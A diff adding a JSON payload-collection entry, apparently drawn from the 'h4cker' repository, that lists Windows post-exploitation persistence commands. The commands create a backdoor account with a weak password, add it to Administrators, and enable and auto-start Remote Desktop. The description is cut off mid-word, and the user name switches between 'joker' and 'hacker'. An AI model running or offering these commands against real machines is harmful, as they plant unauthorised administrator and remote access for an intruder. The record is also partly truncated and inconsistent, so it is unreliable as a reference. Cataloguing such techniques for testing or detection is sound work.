@@ -1,0 +1,27 @@
+{
+  "id": "temp_91ec461fecd7",
+  "category": "temp",
+  "title": "misc windows post exploitation",
+  "description": "# Misc Windows Post Exploitation Tasks\n\n### Adding a Windows User (joker):\n```\nnet user /add joker password123\n```\n\n### Adding a user to the Administrators groups\n```\nnet localgroup administrators /add joker\n```\n\n### Adding a user to the Remote Desktop user group\n```\nnet localgroup \"Remote Desktop users\" hacker /add\n```\n\n### Starting the Remote Desktop service\n```\nnet start TermService\n```\n\n### Verifying if the Remote Desktop Service is active and running\n```\ntasklist /svc | findstr /C:TermServi",
+  "payloads": [
+    "# Misc Windows Post Exploitation Tasks",
+    "### Adding a Windows User (joker):",
+    "net user /add joker password123",
+    "### Adding a user to the Administrators groups",
+    "net localgroup administrators /add joker",
+    "### Adding a user to the Remote Desktop user group",
+    "net localgroup \"Remote Desktop users\" hacker /add",
+    "### Starting the Remote Desktop service",
+    "net start TermService",
+    "### Verifying if the Remote Desktop Service is active and running",
+    "tasklist /svc | findstr /C:TermService",
+    "### Permanently enable Terminal Services",
+    "sc config TermService start=auto",
+    "### Enabling Terminal services via the registry",
+    "Note: You need to reboot after invoking this..."
+  ],
+  "source": "h4cker",
+  "references": [
+    "/workspaces/hunter-skill/h4cker/temp/Ethical_Hacking/Post_Exploitation_and_Lateral_Movement/Persistence/post_exploitation/misc-windows-post-exploitation.md"
+  ]
+}
